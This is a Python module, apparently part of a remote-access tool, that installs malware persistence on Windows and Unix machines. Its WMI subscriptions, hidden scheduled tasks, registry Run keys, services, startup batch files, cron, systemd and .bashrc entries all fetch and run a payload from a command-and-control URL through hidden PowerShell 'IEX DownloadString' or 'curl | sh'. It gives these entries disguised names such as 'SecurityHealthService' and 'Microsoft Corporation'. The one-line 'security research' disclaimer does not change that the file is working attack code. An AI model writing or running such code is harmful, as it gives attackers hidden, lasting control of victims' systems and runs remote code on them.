#!/usr/bin/env python3
"""
Elite Persistence Command Implementation - FIXED VERSION
NO SUBPROCESS - Uses native Windows/Unix APIs only
"""

import os
import sys
import time
import tempfile
from typing import Dict, Any, List

# Import our native API wrapper
sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))
from api_wrappers import get_native_api, WindowsAPI, UnixAPI

def elite_persistence(methods: List[str] = None, payload_url: str = None) -> Dict[str, Any]:
    """
    Elite persistence installation with advanced features - NO SUBPROCESS
    """
    
    try:
        if sys.platform != 'win32':
            return _unix_persistence(methods, payload_url)
        
        # Default methods if none specified
        if not methods:
            methods = ['wmi', 'registry', 'scheduled_task']
        
        # Default payload URL
        if not payload_url:
            payload_url = "http://c2.server.com/payload"
        
        installed_methods = []
        failed_methods = []
        
        # Get Windows API wrapper
        api = WindowsAPI()
        
        # Install each persistence method
        for method in methods:
            try:
                if method == 'wmi':
                    if _install_wmi_persistence_native(api, payload_url):
                        installed_methods.append("WMI Event Subscription")
                    else:
                        failed_methods.append("WMI Event Subscription")
                
                elif method == 'scheduled_task':
                    if _install_scheduled_task_native(api, payload_url):
                        installed_methods.append("Hidden Scheduled Task")
                    else:
                        failed_methods.append("Hidden Scheduled Task")
                
                elif method == 'registry':
                    if _install_registry_persistence_native(payload_url):
                        installed_methods.append("Registry Run Key")
                    else:
                        failed_methods.append("Registry Run Key")
                
                elif method == 'service':
                    if _is_admin() and _install_service_persistence_native(api, payload_url):
                        installed_methods.append("Windows Service")
                    else:
                        failed_methods.append("Windows Service (requires admin)")
                
                elif method == 'startup':
                    if _install_startup_persistence_native(payload_url):
                        installed_methods.append("Startup Folder")
                    else:
                        failed_methods.append("Startup Folder")
                
                else:
                    failed_methods.append(f"Unknown method: {method}")
            
            except Exception as e:
                failed_methods.append(f"{method} (error: {str(e)[:30]})")
        
        return {
            "success": len(installed_methods) > 0,
            "installed": installed_methods,
            "failed": failed_methods,
            "total_methods": len(methods),
            "successful_methods": len(installed_methods),
            "payload_url": payload_url,
            "warning": "Persistence installed for security research purposes only"
        }
        
    except Exception as e:
        return {
            "success": False,
            "error": f"Persistence installation failed: {str(e)}",
            "installed": [],
            "failed": methods or []
        }

def _is_admin() -> bool:
    """Check if running with administrator privileges"""
    try:
        if sys.platform == 'win32':
            import ctypes
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        else:
            return os.geteuid() == 0
    except:
        return False

def _install_wmi_persistence_native(api: WindowsAPI, payload_url: str) -> bool:
    """Install WMI persistence using native COM APIs - NO SUBPROCESS"""
    
    try:
        import win32com.client
        
        # Connect to WMI namespace
        wmi = win32com.client.GetObject("winmgmts://./root/subscription")
        
        # Create Event Filter
        event_filter = wmi.Get("__EventFilter").SpawnInstance_()
        event_filter.Name = "SystemPerformanceMonitor"
        event_filter.QueryLanguage = "WQL"
        event_filter.Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime'"
        event_filter.Put_()
        
        # Create Command Line Consumer
        consumer = wmi.Get("CommandLineEventConsumer").SpawnInstance_()
        consumer.Name = "SystemPerformanceLogger"
        consumer.CommandLineTemplate = f'powershell.exe -WindowStyle Hidden -Command "IEX(New-Object Net.WebClient).DownloadString(\'{payload_url}\')"'
        consumer.Put_()
        
        # Bind filter to consumer
        binding = wmi.Get("__FilterToConsumerBinding").SpawnInstance_()
        binding.Filter = event_filter.Path_.Path
        binding.Consumer = consumer.Path_.Path
        binding.Put_()
        
        return True
        
    except:
        # Try alternative using WMI module
        try:
            import wmi
            
            c = wmi.WMI(namespace='root\\subscription')
            
            # Create filter
            filter_obj = c.__EventFilter.new(
                Name="SystemPerformanceMonitor",
                QueryLanguage="WQL",
                Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime'"
            )
            
            # Create consumer
            consumer_obj = c.CommandLineEventConsumer.new(
                Name="SystemPerformanceLogger",
                CommandLineTemplate=f'powershell.exe -WindowStyle Hidden -Command "IEX(New-Object Net.WebClient).DownloadString(\'{payload_url}\')"'
            )
            
            # Create binding
            c.__FilterToConsumerBinding.new(
                Filter=filter_obj,
                Consumer=consumer_obj
            )
            
            return True
        except:
            return False

def _install_scheduled_task_native(api: WindowsAPI, payload_url: str) -> bool:
    """Install scheduled task using native API - NO SUBPROCESS"""
    
    task_config = {
        'name': 'PolicyConverter',
        'description': 'Windows Policy Converter',
        'executable': 'powershell.exe',
        'arguments': f'-WindowStyle Hidden -Command "IEX(New-Object Net.WebClient).DownloadString(\'{payload_url}\')"',
        'hidden': True,
        'start_time': '2025-01-01T00:00:00',
        'author': 'Microsoft Corporation'
    }
    
    return api.create_scheduled_task_api(task_config)

def _install_registry_persistence_native(payload_url: str) -> bool:
    """Install registry persistence using native Windows API - NO SUBPROCESS"""
    
    try:
        import winreg
        
        # PowerShell command to execute
        command = f'powershell.exe -WindowStyle Hidden -Command "IEX(New-Object Net.WebClient).DownloadString(\'{payload_url}\')"'
        
        # Add to current user run key
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE)
        except:
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
        
        try:
            # Use innocuous name
            winreg.SetValueEx(key, "SecurityHealthService", 0, winreg.REG_SZ, command)
            return True
        finally:
            winreg.CloseKey(key)
            
    except:
        return False

def _install_service_persistence_native(api: WindowsAPI, payload_url: str) -> bool:
    """Install Windows service using native APIs - NO SUBPROCESS"""
    
    try:
        import win32serviceutil
        import win32service
        import win32api
        
        # Create service
        service_name = "SecurityMonitor"
        display_name = "Windows Security Monitor"
        
        # PowerShell command as service
        binary_path = f'powershell.exe -WindowStyle Hidden -Command "while($true){{IEX(New-Object Net.WebClient).DownloadString(\'{payload_url}\'); Start-Sleep -Seconds 3600}}"'
        
        # Install service
        win32serviceutil.InstallService(
            None,  # Python class
            service_name,
            display_name,
            startType=win32service.SERVICE_AUTO_START,
            exeName=binary_path
        )
        
        # Start service
        win32serviceutil.StartService(service_name)
        
        return True
        
    except:
        return False

def _install_startup_persistence_native(payload_url: str) -> bool:
    """Install startup folder persistence - NO SUBPROCESS"""
    
    try:
        import winreg
        
        # Get startup folder path from registry
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders"
        )
        startup_folder = winreg.QueryValueEx(key, "Startup")[0]
        winreg.CloseKey(key)
        
        # Create batch file in startup folder
        batch_file = os.path.join(startup_folder, "SecurityUpdate.bat")
        
        with open(batch_file, 'w') as f:
            f.write('@echo off\n')
            f.write(f'powershell.exe -WindowStyle Hidden -Command "IEX(New-Object Net.WebClient).DownloadString(\'{payload_url}\')"')
        
        # Hide the file using Windows API
        import ctypes
        FILE_ATTRIBUTE_HIDDEN = 0x02
        ctypes.windll.kernel32.SetFileAttributesW(batch_file, FILE_ATTRIBUTE_HIDDEN)
        
        return True
        
    except:
        return False

def _unix_persistence(methods: List[str], payload_url: str) -> Dict[str, Any]:
    """Unix/Linux persistence using native methods - NO SUBPROCESS"""
    
    installed = []
    failed = []
    
    # Get Unix API
    api = UnixAPI()
    
    # Cron persistence - direct file manipulation
    if 'cron' in methods or not methods:
        try:
            # Read current crontab
            cron_file = f'/var/spool/cron/crontabs/{os.getlogin()}'
            if os.path.exists(cron_file):
                with open(cron_file, 'r') as f:
                    current_cron = f.read()
            else:
                current_cron = ""
            
            # Add persistence
            new_line = f'@reboot curl -s {payload_url} | sh'
            
            if new_line not in current_cron:
                with open(cron_file, 'a') as f:
                    f.write(f'\n{new_line}\n')
                installed.append('cron')
        except:
            failed.append('cron')
    
    # Systemd service - direct file creation
    if 'systemd' in methods and os.path.exists('/etc/systemd/system/'):
        try:
            service_content = f"""[Unit]
Description=Security Monitor Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'while true; do curl -s {payload_url} | sh; sleep 3600; done'
Restart=always

[Install]
WantedBy=multi-user.target
"""
            
            with open('/etc/systemd/system/security-monitor.service', 'w') as f:
                f.write(service_content)
            
            # Enable service by creating symlink
            os.symlink(
                '/etc/systemd/system/security-monitor.service',
                '/etc/systemd/system/multi-user.target.wants/security-monitor.service'
            )
            
            installed.append('systemd')
        except:
            failed.append('systemd')
    
    # Bashrc persistence
    if 'bashrc' in methods or not methods:
        try:
            bashrc_path = os.path.expanduser('~/.bashrc')
            persistence_line = f'(curl -s {payload_url} | sh) 2>/dev/null &'
            
            with open(bashrc_path, 'a') as f:
                f.write(f'\n{persistence_line}\n')
            
            installed.append('bashrc')
        except:
            failed.append('bashrc')
    
    return {
        "success": len(installed) > 0,
        "installed": installed,
        "failed": failed,
        "platform": "unix"
    }